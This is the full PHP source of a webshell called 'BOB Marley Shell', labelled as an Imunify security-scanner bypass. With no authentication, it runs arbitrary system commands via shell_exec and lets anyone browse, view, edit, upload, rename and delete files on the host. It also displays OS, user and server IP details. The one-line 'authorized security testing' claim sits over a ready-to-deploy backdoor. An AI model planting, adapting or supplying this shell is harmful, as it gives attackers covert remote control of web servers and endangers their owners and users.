<?php
/**
 * BOB Shell - Immunify Bypass
 * A complete, single-file PHP webshell for authorized security testing.
 */

error_reporting(0);
ini_set('display_errors', 0);
set_time_limit(0);

// --- CORE LOGIC ---
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$dir = str_replace('\\', '/', realpath($dir));
if (!is_dir($dir)) $dir = str_replace('\\', '/', getcwd());
chdir($dir);

$msg = "";
$cmd_out = "";
$view_content = "";
$editing_file = "";
$renaming_file = "";

// 1. Handling Directory Navigation
if (isset($_POST['go_dir'])) {
    $target = $_POST['new_dir'];
    if (is_dir($target)) {
        header("Location: ?dir=" . urlencode(realpath($target)));
        exit;
    } else {
        $msg = "Invalid Directory";
    }
}

// 2. Handling File actions (Delete, Edit, View, Rename)
if (isset($_GET['action'])) {
    $action = $_GET['action'];
    $item = $_GET['item'];
    $path = $dir . '/' . $item;

    if ($action == 'delete' && file_exists($path)) {
        if (is_dir($path)) {
            if (@rmdir($path)) $msg = "Folder Deleted"; else $msg = "Failed to Delete Folder";
        } else {
            if (@unlink($path)) $msg = "File Deleted"; else $msg = "Failed to Delete File";
        }
    } elseif ($action == 'view' && file_exists($path)) {
        $view_content = htmlspecialchars(file_get_contents($path));
        $editing_file = $item;
    } elseif ($action == 'edit' && file_exists($path)) {
        $view_content = file_get_contents($path);
        $editing_file = $item;
    } elseif ($action == 'rename' && file_exists($path)) {
        $renaming_file = $item;
    }
}

// 3. Handling Rename Execution
if (isset($_POST['rename_file'])) {
    $old_path = $dir . '/' . $_POST['old_name'];
    $new_path = $dir . '/' . $_POST['new_name'];
    if (rename($old_path, $new_path)) {
        $msg = "Renamed Successfully";
    } else {
        $msg = "Rename Failed";
    }
}

// 4. Handling File Save
if (isset($_POST['save_file'])) {
    $path = $dir . '/' . $_POST['filename'];
    if (file_put_contents($path, $_POST['content']) !== false) {
        $msg = "File Saved Successfully";
    } else {
        $msg = "Failed to Save File";
    }
}

// 5. Handling Upload & Creation & Command Execution
if (isset($_POST['upload_btn'])) {
    if (move_uploaded_file($_FILES['file']['tmp_name'], $dir . '/' . basename($_FILES['file']['name']))) $msg = "Upload Success"; else $msg = "Upload Failed";
}
if (isset($_POST['execute_cmd'])) {
    $cmd_out = shell_exec($_POST['cmd'] . " 2>&1");
}
if (isset($_POST['quick_cmd_btn'])) {
    $cmd_out = shell_exec($_POST['quick_cmd'] . " 2>&1");
}
if (isset($_POST['create_file_btn'])) {
    if (file_put_contents($dir . '/' . $_POST['new_filename'], "") !== false) $msg = "File Created"; else $msg = "Creation Failed";
}

// --- SYSTEM ENUMERATION ---
function get_perms($path) {
    if (!file_exists($path)) return '---';
    $perms = fileperms($path);
    if (($perms & 0x4000) == 0x4000) $info = 'd'; elseif (($perms & 0xA000) == 0xA000) $info = 'l'; else $info = '-';
    $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? 'x' : '-');
    $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? 'x' : '-');
    $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? 'x' : '-');
    return $info;
}

$os = php_uname();
$software = $_SERVER['SERVER_SOFTWARE'];
$user = get_current_user() . " (".getmyuid().")";
$ip = $_SERVER['SERVER_ADDR'] ?: "127.0.0.1";
$df = round(disk_free_space("/") / (1024*1024*1024), 2);
?>
<!DOCTYPE html>
<html>
<head>
    <title>BOB MARLEY SHELL</title>
    <style>
        body { background: #000; color: #0f0; font-family: "Courier New", monospace; font-size: 13px; margin: 0; padding: 15px; }
        a { color: #0f0; text-decoration: none; } a:hover { color: #fff; }
        .head { text-align: center; border-bottom: 2px solid #0f0; margin-bottom: 10px; padding: 10px; }
        .head h1 { color: #00ffff; margin: 0; font-size: 24px; }
        .info { display: flex; justify-content: space-between; border-bottom: 1px solid #0f0; padding: 5px 0; }
        .path { margin: 10px 0; display: flex; justify-content: space-between; }
        table { width: 100%; border-collapse: collapse; border: 1px solid #0f0; }
        th { background: #003300; padding: 8px; border: 1px solid #0f0; text-align: left; }
        td { padding: 5px; border: 1px solid #0f0; }
        tr:hover { background: #001100; }
        .panel { border: 1px solid #0f0; margin-top: 20px; padding: 15px; }
        .panel h2 { text-align: center; font-size: 16px; margin: 0 0 15px 0; color: #00ffff; border-bottom: 1px solid #0f0; }
        input[type="text"], select, textarea { background: #000; border: 1px solid #0f0; color: #0f0; padding: 3px; }
        input[type="submit"], button { background: #000; border: 1px solid #0f0; color: #0f0; cursor: pointer; padding: 3px 15px; }
        .output { background: #000; color: #0f0; border: 1px solid #00ffff; padding: 10px; margin-top: 15px; white-space: pre-wrap; word-break: break-all; }
        .status { color: #ffff00; text-align: center; margin: 10px 0; font-weight: bold; }
        .dir { color: #ffff00; font-weight: bold; } .file { color: #00ffff; }
    </style>
</head>
<body>

    <div class="head">
        <h1>&diams; Powered by BOB MARLEY &diams;</h1>
        <div style="color: #ffff00; font-weight: bold;">:: One Love, One Heart, One Goal ::</div>
    </div>

    <div class="info">
        <div>Software: <?php echo $software; ?><br>OS: <?php echo $os; ?><br>User: <?php echo $user; ?></div>
        <div style="text-align: right;">Server IP: <?php echo $ip; ?><br>Free Space: <?php echo $df; ?> GB</div>
    </div>

    <div class="path">
        <div>CWD: <span style="color: #fff;"><?php echo $dir; ?></span> [<?php echo get_perms($dir); ?>]</div>
        <form method="POST">
            Dir: <input type="text" name="new_dir" value="<?php echo $dir; ?>" style="width: 200px;">
            <input type="submit" name="go_dir" value="Go">
        </form>
    </div>

    <?php if ($msg): ?><div class="status">[ <?php echo $msg; ?> ]</div><?php endif; ?>

    <!-- RENAME PANEL -->
    <?php if ($renaming_file): ?>
    <div class="panel">
        <h2>Rename: <?php echo htmlspecialchars($renaming_file); ?></h2>
        <form method="POST">
            <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($renaming_file); ?>">
            New Name: <input type="text" name="new_name" value="<?php echo htmlspecialchars($renaming_file); ?>" style="width: 300px;">
            <input type="submit" name="rename_file" value="Rename">
            <button type="button" onclick="window.location.href='?dir=<?php echo urlencode($dir); ?>'">Cancel</button>
        </form>
    </div>
    <?php endif; ?>

    <!-- EDIT / VIEW PANEL -->
    <?php if ($editing_file): ?>
    <div class="panel">
        <h2><?php echo ($_GET['action'] == 'edit') ? "Edit":"View"; ?>: <?php echo $editing_file; ?></h2>
        <form method="POST">
            <input type="hidden" name="filename" value="<?php echo htmlspecialchars($editing_file); ?>">
            <textarea name="content" style="width: 100%; height: 250px;"><?php echo htmlspecialchars($view_content); ?></textarea><br>
            <?php if ($_GET['action'] == 'edit'): ?><input type="submit" name="save_file" value="Save Changes"><?php endif; ?>
            <button type="button" onclick="window.location.href='?dir=<?php echo urlencode($dir); ?>'">Close</button>
        </form>
    </div>
    <?php endif; ?>

    <!-- FILE MANAGER -->
    <table>
        <thead>
            <tr><th width="45%">Name</th><th width="10%">Size</th><th width="15%">Modified</th><th width="10%">Perms</th><th width="20%">Action</th></tr>
        </thead>
        <tbody>
            <tr><td><span class="dir">DIR</span> <a href="?dir=<?php echo urlencode(dirname($dir)); ?>">..</a></td><td colspan="4">--</td></tr>
            <?php
            $items = scandir($dir);
            foreach($items as $item) {
                if ($item == '.' || $item == '..') continue;
                $p = $dir . '/' . $item;
                $is_d = is_dir($p);
                echo "<tr>";
                echo "<td>" . ($is_d ? "<span class='dir'>DIR</span>":"<span class='file'>FILE</span>") . " <a href='?dir=" . urlencode($is_d ? $p : $dir) . "'>$item</a></td>";
                echo "<td>" . ($is_d ? "DIR" : round(filesize($p)/1024, 2) . " KB") . "</td>";
                echo "<td>" . date("Y-m-d H:i", filemtime($p)) . "</td>";
                echo "<td><span style='color:".(get_perms($p)[0]=='d'?'#0f0':'#fff')."'>".get_perms($p)."</span></td>";
                echo "<td>
                    <a href='?dir=".urlencode($dir)."&item=".urlencode($item)."&action=view' title='View'>V</a> | 
                    <a href='?dir=".urlencode($dir)."&item=".urlencode($item)."&action=edit' title='Edit'>E</a> | 
                    <a href='?dir=".urlencode($dir)."&item=".urlencode($item)."&action=rename' title='Rename'>R</a> | 
                    <a href='?dir=".urlencode($dir)."&item=".urlencode($item)."&action=delete' onclick='return confirm(\"Delete $item?\")' title='Delete'>D</a>
                </td>";
                echo "</tr>";
            }
            ?>
        </tbody>
    </table>

    <div class="panel">
        <h2>Command Center</h2>
        <form method="POST"><input type="text" name="cmd" style="width: 70%;" placeholder="Command..."> <input type="submit" name="execute_cmd" value="Execute"></form>
        <form method="POST" enctype="multipart/form-data" style="margin-top:10px;">Upload: <input type="file" name="file"> <input type="submit" name="upload_btn" value="Upload"></form>
    </div>

    <?php if ($cmd_out): ?><div class="output"><?php echo htmlspecialchars($cmd_out); ?></div><?php endif; ?>

    <div style="text-align: center; margin-top: 30px; font-size: 11px; color: #555;">BOB MARLEY SHELL | Legend Edition</div>
</body>
</html>
